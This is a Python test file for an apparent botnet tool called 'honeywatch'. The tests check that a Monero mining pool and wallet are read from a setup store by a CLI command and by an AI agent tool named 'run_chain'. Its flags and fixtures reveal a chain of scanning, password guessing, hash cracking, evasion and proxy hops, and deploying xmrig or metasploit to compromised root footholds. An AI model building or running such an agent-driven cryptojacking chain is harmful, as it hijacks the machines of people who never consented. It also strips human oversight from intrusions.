"""Regression tests for the Monero-wallet-configured-during-setup wiring.

The wallet + pool are configured once via ``honeywatch setup`` (persisted in the
agent_setup SQLite store). These tests pin that:

  W1  `honeywatch botnet` defaults pool/wallet/worker/TLS from the setup store
      when --pool/--wallet are absent (so you don't re-pass them every run).
  W2  explicit --pool/--wallet on `honeywatch botnet` still override setup.
  W3  with no setup configured, botnet falls back to empty/honeywatch defaults.
  W4  the `run_chain` agent tool auto-fills pool/wallet from ctx.agent_config
      (the setup store) instead of requiring them as tool args every call.
  W5  run_chain errors clearly when the wallet/pool are configured nowhere
      (neither passed nor in setup), pointing the operator at set_wallet/setup.
  W6  chain phase_persist aborts on a missing *wallet* (not just a missing
      pool) -- a miner deploy with an empty wallet is silently useless.
"""

from __future__ import annotations

import types

from honeywatch.agent.setup import AgentConfig, SetupStore
from honeywatch.agent.tools import ToolContext, execute_tool
from honeywatch.chain import ChainConfig, ChainOrchestrator


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #

def _botnet_args(db_path: str, **overrides) -> types.SimpleNamespace:
    """A minimal argparse-like namespace matching `honeywatch botnet` flags."""
    base = dict(
        targets=[],
        scan_tool="masscan",
        scan_rate=None,
        max_hosts=None,
        users=None,
        user_file=None,
        passwords=None,
        password_file=None,
        payload="xmrig",
        pool=None,
        wallet=None,
        worker=None,
        threads=0,
        tls=False,
        evasion=None,
        hashcrack_wordlist=None,
        hashcrack_tool="hashcat",
        business_hours=False,
        proxy_file=None,
        jump_file=None,
        delay=0.0,
        jitter=0.5,
        lockout_delay=0.0,
        host_concurrency=8,
        min_confidence=0.7,
        max_rounds=3,
        skip_vpn_check=False,
        db=db_path,
        shadow_stash=".honeywatch/shadow_stash",
        config=None,
    )
    base.update(overrides)
    return types.SimpleNamespace(**base)


def _save_setup(db_path: str, **kw) -> AgentConfig:
    cfg = AgentConfig(**kw)
    SetupStore(db_path).save_config(cfg)
    return cfg


# --------------------------------------------------------------------------- #
# W1-W3: honeywatch botnet reads the wallet/pool from the setup store
# --------------------------------------------------------------------------- #

def test_botnet_defaults_wallet_and_pool_from_setup(tmp_path):
    from honeywatch.cmd_botnet import _build_botnet_config

    db = str(tmp_path / "hw.db")
    _save_setup(
        db,
        pool="stratum+tcp://pool.example.com:3333",
        wallet="4MoneroWalletAddress" * 6,
        worker="rig-1",
        tls=True,
    )
    cfg = _build_botnet_config(_botnet_args(db))

    assert cfg.pool == "stratum+tcp://pool.example.com:3333"
    assert cfg.wallet == "4MoneroWalletAddress" * 6
    assert cfg.worker == "rig-1"
    assert cfg.tls is True
    assert cfg.db_path == db


def test_botnet_cli_flags_override_setup(tmp_path):
    from honeywatch.cmd_botnet import _build_botnet_config

    db = str(tmp_path / "hw.db")
    _save_setup(db, pool="setup-pool", wallet="setup-wallet", worker="setup-w")
    cfg = _build_botnet_config(
        _botnet_args(db, pool="cli-pool", wallet="cli-wallet", worker="cli-w")
    )

    assert cfg.pool == "cli-pool"
    assert cfg.wallet == "cli-wallet"
    assert cfg.worker == "cli-w"


def test_botnet_without_setup_falls_back_to_defaults(tmp_path):
    from honeywatch.cmd_botnet import _build_botnet_config

    db = str(tmp_path / "fresh.db")  # no setup wizard ever run
    cfg = _build_botnet_config(_botnet_args(db))

    assert cfg.pool == ""
    assert cfg.wallet == ""
    assert cfg.worker == "honeywatch"
    assert cfg.tls is False


# --------------------------------------------------------------------------- #
# W4-W5: the run_chain agent tool auto-fills from the setup store
# --------------------------------------------------------------------------- #

def _ctx(tmp_path, agent_config: AgentConfig) -> ToolContext:
    return ToolContext(db_path=str(tmp_path / "tool.db"),
                       agent_config=agent_config, skip_vpn_check=True)


def test_run_chain_tool_autofills_wallet_from_setup(tmp_path):
    """With wallet/pool in setup and none passed, run_chain runs (no error)."""
    cfg = AgentConfig(
        ollama_api_key="k",
        pool="stratum+tcp://pool.example.com:3333",
        wallet="4MoneroWalletAddress" * 6,
    )
    ctx = _ctx(tmp_path, cfg)
    result = execute_tool("run_chain", {"skip_vpn_check": True, "max_rounds": 1}, ctx)

    assert "error" not in result, result
    assert result["rounds"] == 1
    assert "growth exhausted" in result["stop_reason"]


def test_run_chain_tool_errors_when_wallet_configured_nowhere(tmp_path):
    """Neither passed nor in setup -> clear, actionable error (no silent run)."""
    ctx = _ctx(tmp_path, AgentConfig())  # empty wallet + pool
    result = execute_tool("run_chain", {"skip_vpn_check": True}, ctx)

    assert "error" in result
    assert "pool" in result["error"]
    assert "wallet" in result["error"]
    assert "setup" in result["error"].lower()


def test_run_chain_tool_explicit_args_override_setup(tmp_path):
    """Explicit pool/wallet args win over the setup store."""
    cfg = AgentConfig(ollama_api_key="k", pool="setup-pool", wallet="setup-wallet")
    ctx = _ctx(tmp_path, cfg)
    result = execute_tool(
        "run_chain",
        {"pool": "cli-pool", "wallet": "cli-wallet", "skip_vpn_check": True,
         "max_rounds": 1},
        ctx,
    )
    assert "error" not in result, result


def test_run_chain_tool_non_miner_payload_skips_wallet_check(tmp_path):
    """A non-miner payload (e.g. metasploit) doesn't need a wallet."""
    ctx = _ctx(tmp_path, AgentConfig())  # no wallet anywhere
    result = execute_tool(
        "run_chain",
        {"payload": "metasploit", "skip_vpn_check": True, "max_rounds": 1},
        ctx,
    )
    assert "error" not in result, result


# --------------------------------------------------------------------------- #
# W6: phase_persist aborts on a missing wallet (not just a missing pool)
# --------------------------------------------------------------------------- #

def test_phase_persist_aborts_without_wallet():
    """Pool set, wallet empty -> abort naming wallet, nothing enqueued."""
    cfg = ChainConfig(payload_id="xmrig", pool="p", wallet="")
    orch = ChainOrchestrator(cfg)
    orch.state.footholds = [("10.0.0.1", 22, "root", "pw")]

    orch.phase_persist()

    assert orch.state.enqueued == []
    msg = next(e["msg"] for e in orch.state.log
              if e["phase"] == "persist" and "ABORT" in e["msg"])
    assert "wallet" in msg
    assert "pool" not in msg  # pool is set, so it's not in the missing list


def test_phase_persist_aborts_without_pool():
    """Wallet set, pool empty -> abort naming pool only."""
    cfg = ChainConfig(payload_id="xmrig", pool="", wallet="w")
    orch = ChainOrchestrator(cfg)
    orch.state.footholds = [("10.0.0.1", 22, "root", "pw")]

    orch.phase_persist()

    assert orch.state.enqueued == []
    msg = next(e["msg"] for e in orch.state.log
              if e["phase"] == "persist" and "ABORT" in e["msg"])
    assert "pool" in msg
    assert "wallet" not in msg